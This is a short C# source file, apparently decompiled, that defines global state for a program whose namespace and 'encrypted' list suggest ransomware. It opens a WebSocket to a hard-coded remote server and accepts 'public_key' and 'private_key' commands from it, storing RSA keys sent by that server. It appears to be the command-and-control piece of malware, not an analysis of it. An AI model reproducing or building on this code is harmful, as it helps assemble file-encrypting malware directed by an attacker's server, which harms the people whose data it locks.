using System.Collections.Generic;
using System.Windows.Forms;
using Newtonsoft.Json;
using WebSocketSharp;

namespace Cockblocker;

public class Globals
{
	public struct cmd
	{
		public string _name;

		public string _args;

		public cmd(string name, string args)
		{
			_name = name;
			_args = args;
		}
	}

	public static List<string> encrypted = new List<string>();

	public static WebSocket ws = new WebSocket("ws://collabvm.xyz:4444/rs", new string[0]);

	public static Encryption.EncryptorRSAKeys Keys = new Encryption.EncryptorRSAKeys();

	public static void Ws_OnMessage(object sender, MessageEventArgs e)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		cmd cmd = JsonConvert.DeserializeObject<cmd>(e.get_Data());
		if (cmd._name == "public_key")
		{
			Keys.PublicKey = cmd._args;
			MessageBox.Show(cmd._args);
		}
		else if (cmd._name == "welcome")
		{
			Keys.PublicKey = cmd._args;
		}
		else if (cmd._name == "private_key")
		{
			Keys.PrivateKey = cmd._args;
		}
	}
}
